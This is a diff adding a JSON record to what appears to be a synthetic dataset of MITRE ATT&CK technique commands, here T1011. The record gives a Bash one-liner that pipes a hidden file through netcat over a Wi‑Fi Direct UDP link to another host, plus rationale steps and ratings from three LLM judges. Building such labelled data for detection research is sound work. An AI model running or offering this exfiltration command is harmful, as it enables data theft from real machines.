@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "nohup tcpdump -i p2p-wlp2s0-0 -nn udp port 55303 -U -w /dev/null >/dev/null 2>&1 & dd if=/var/tmp/.sdata bs=64k 2>/dev/null | nc -u -s 192.168.49.1 192.168.49.2 55303",
+  "explanation": "Streams a data file over Wi‑Fi Direct (p2p interface) using UDP on an uncommon port while silently monitoring that port. This is exfiltration over an alternate wireless medium in line with T1011.",
+  "rationale_steps": [
+    "Use the Wi‑Fi Direct interface to bypass the primary WLAN.",
+    "Send via UDP on port 55303 to avoid standard services.",
+    "Run tcpdump scoped to the p2p interface and port, discarding output.",
+    "Pipe dd output into nc, binding to the P2P source IP."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-a2471e69-370f7eb0",
+  "source_prompt_hash": "a2471e69",
+  "timestamp_utc": "2025-09-30T08:19:52.942834Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash with valid flags, proper redirections, correct piping/backgrounding, and no quoting or separator issues.",
+        "semantic_score": 4,
+        "semantic_justification": "It streams the file via UDP using a Wi‑Fi Direct IP and passively sniffs that port on the p2p interface consistent with T1011, though tcpdump typically requires elevated privileges and nc does not explicitly bind to the interface.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T00:55:44.174884Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is well-formed with valid piping, backgrounding, and redirection constructs, though the tcpdump writing to /dev/null while also suppressing output is redundant but syntactically valid, and the nc -u -s flag usage (binding source IP) is correct syntax.",
+        "semantic_score": 4,
+        "semantic_justification": "The command credibly implements T1011 by using a Wi-Fi Direct p2p interface (p2p-wlp2s0-0) to exfiltrate data from a hidden file via UDP with netcat over an alternate wireless medium, though writing tcpdump capture to /dev/null defeats its monitoring purpose and the 'None' privilege claim is questionable since tcpdump typically requires elevated privileges or CAP_NET_RAW.",
+        "combined_score": 4.0,
+        "confidence": 0.82,
+        "timestamp": "2026-02-18T22:03:43.874157Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command correctly uses bash shell features like backgrounding, pipes, and standard tool flags for tcpdump, dd, and nc.",
+        "semantic_score": 4,
+        "semantic_justification": "The command effectively targets a Wi-Fi Direct interface for exfiltration via UDP, though it lists 'None' for privileges despite tcpdump usually requiring root or CAP_NET_RAW.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:03:46.974804Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.333,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
